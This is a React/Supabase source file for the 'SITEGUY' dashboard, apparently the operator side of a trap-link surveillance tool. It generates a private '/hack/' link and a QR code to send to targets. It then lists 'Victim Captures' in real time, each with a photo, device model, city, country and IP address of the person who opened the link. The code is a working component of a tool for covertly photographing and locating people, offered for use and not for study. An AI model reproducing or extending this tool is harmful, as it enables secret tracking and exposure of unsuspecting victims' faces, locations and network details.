import { useEffect, useState } from 'react';
import { supabase } from '../utils/supabase';
import QRCode from 'qrcode.react';
import { motion } from 'framer-motion';
import { useNavigate } from 'react-router-dom';

const Dashboard = () => {
  const [uniqueId, setUniqueId] = useState(null);
  const [captures, setCaptures] = useState([]);
  const [loading, setLoading] = useState(true);
  const navigate = useNavigate();

  useEffect(() => {
    const fetchUserDataAndCaptures = async () => {
      setLoading(true);
      
      // 1. Get Logged-in User
      const { data: { user }, error: userError } = await supabase.auth.getUser();
      
      if (userError || !user) {
        navigate('/');
        return;
      }

      // 2. Get User's Unique ID from 'profiles' table
      const { data: profile, error: profileError } = await supabase
        .from('profiles')
        .select('unique_id')
        .eq('id', user.id)
        .single();

      if (profile) {
        setUniqueId(profile.unique_id);

        // 3. Get ONLY captures belonging to this uniqueId
        const { data: existingCaptures } = await supabase
          .from('captures')
          .select('*')
          .eq('user_id', profile.unique_id) // Filter by user's ID
          .order('created_at', { ascending: false });
        
        if (existingCaptures) setCaptures(existingCaptures);

        // 4. Real-time updates for THIS user only
        const channel = supabase
          .channel(`captures_${profile.unique_id}`)
          .on(
            'postgres_changes', 
            { 
              event: 'INSERT', 
              schema: 'public', 
              table: 'captures',
              filter: `user_id=eq.${profile.unique_id}` // Sirf is user ka data monitor karega
            }, 
            (payload) => {
              setCaptures((prev) => [payload.new, ...prev]);
            }
          )
          .subscribe();

        setLoading(false);
        return () => supabase.removeChannel(channel);
      }
    };

    fetchUserDataAndCaptures();
  }, [navigate]);

  const handleLogout = async () => {
    await supabase.auth.signOut();
    navigate('/');
  };

  if (loading) {
    return (
      <div className="min-h-screen bg-gray-950 flex items-center justify-center">
        <div className="text-green-500 font-mono animate-pulse">INITIALIZING SECURE SESSION...</div>
      </div>
    );
  }

  const baseUrl = window.location.origin;
  const trapLink = `${baseUrl}/hack/${uniqueId}`;

  return (
    <div className="min-h-screen bg-gray-950 text-white p-4 md:p-8 font-sans">
      {/* Header */}
      <header className="max-w-7xl mx-auto mb-10 flex justify-between items-center bg-gray-900 p-6 rounded-2xl border border-gray-800 shadow-xl">
        <div>
          <h1 className="text-2xl font-bold tracking-tighter text-white">SITEGUY <span className="text-green-500">DASHBOARD</span></h1>
          <p className="text-gray-500 text-[10px] uppercase tracking-widest mt-1">Multi-User Console v2.0</p>
        </div>
        <button 
          onClick={handleLogout}
          className="bg-red-500/10 hover:bg-red-500 text-red-500 hover:text-white px-4 py-2 rounded-lg text-xs font-bold transition-all border border-red-500/20"
        >
          LOGOUT
        </button>
      </header>

      <div className="max-w-7xl mx-auto grid grid-cols-1 lg:grid-cols-3 gap-8">
        
        {/* Sidebar: Control Panel */}
        <div className="space-y-6">
          <motion.div 
            initial={{ opacity: 0, y: 20 }}
            animate={{ opacity: 1, y: 0 }}
            className="bg-gray-900 p-6 rounded-3xl border border-gray-800"
          >
            <h2 className="text-sm font-bold text-gray-400 mb-4 uppercase tracking-widest">Your Private Link</h2>
            <div className="bg-black/50 p-4 rounded-xl break-all text-[11px] text-green-400 font-mono mb-6 border border-gray-800">
              {trapLink}
            </div>
            
            <div className="flex justify-center bg-white p-4 rounded-2xl w-max mx-auto mb-4">
              <QRCode value={trapLink} size={150} />
            </div>
            
            <button 
              onClick={() => {
                navigator.clipboard.writeText(trapLink);
                alert("Link Copied!");
              }}
              className="w-full bg-gray-800 hover:bg-gray-700 text-white py-3 rounded-xl text-sm font-semibold transition"
            >
              COPY LINK
            </button>
          </motion.div>

          <div className="bg-green-500/5 p-6 rounded-3xl border border-green-500/10">
            <h3 className="text-green-500 font-bold text-xs uppercase tracking-widest mb-3">Live Status</h3>
            <div className="flex items-center gap-2">
              <span className="w-2 h-2 bg-green-500 rounded-full animate-ping"></span>
              <span className="text-sm text-gray-300 font-medium">System Armed & Ready</span>
            </div>
          </div>
        </div>

        {/* Main Feed: Captures */}
        <div className="lg:col-span-2">
          <h2 className="text-xl font-bold mb-6 flex items-center gap-3">
            Victim Captures
            <span className="bg-gray-800 text-gray-400 text-[10px] px-2 py-1 rounded-full">{captures.length}</span>
          </h2>

          <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
            {captures.map((capture) => (
              <motion.div 
                key={capture.id}
                layout
                initial={{ opacity: 0, scale: 0.9 }}
                animate={{ opacity: 1, scale: 1 }}
                className="bg-gray-900 rounded-3xl overflow-hidden border border-gray-800 shadow-2xl"
              >
                <div className="aspect-video bg-black relative">
                  <img src={capture.image_url} alt="Capture" className="w-full h-full object-cover" />
                  <div className="absolute top-4 left-4 bg-red-600 text-white text-[9px] font-black px-2 py-1 rounded uppercase tracking-tighter">Live Entry</div>
                </div>
                
                <div className="p-6">
                  <div className="grid grid-cols-2 gap-4 mb-4">
                    <div>
                      <p className="text-[10px] text-gray-500 uppercase font-bold mb-1">Device</p>
                      <p className="text-sm font-semibold text-white truncate">{capture.device_model}</p>
                    </div>
                    <div className="text-right">
                      <p className="text-[10px] text-gray-500 uppercase font-bold mb-1">Location</p>
                      <p className="text-sm font-semibold text-white truncate">{capture.location_city}, {capture.location_country}</p>
                    </div>
                  </div>
                  
                  <div className="pt-4 border-t border-gray-800 flex justify-between items-center text-[11px]">
                    <span className="text-gray-500 font-mono">IP: {capture.ip_address}</span>
                    <span className="text-gray-600">{new Date(capture.created_at).toLocaleTimeString()}</span>
                  </div>
                </div>
              </motion.div>
            ))}

            {captures.length === 0 && (
              <div className="col-span-full h-80 flex flex-col items-center justify-center text-gray-600 border-2 border-dashed border-gray-900 rounded-3xl">
                <p className="text-sm font-medium">Waiting for activity...</p>
                <p className="text-[10px] uppercase tracking-widest mt-2">Send your link to start capturing</p>
              </div>
            )}
          </div>
        </div>

      </div>
    </div>
  );
};

export default Dashboard;
